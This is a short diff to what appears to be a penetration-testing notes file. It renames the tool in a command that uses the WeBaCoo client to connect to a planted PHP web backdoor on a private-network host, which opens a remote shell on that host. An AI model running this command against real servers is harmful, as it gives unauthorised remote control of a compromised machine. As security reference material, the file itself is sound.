@@ -178,5 +178,5 @@ backdoor.php
 ##Cracking
 
 ```
-$ webacoo.pl -t -u http://192.168.yyy.zzz/backdoor.php
+$ webacoo -t -u http://192.168.yyy.zzz/backdoor.php
 ```
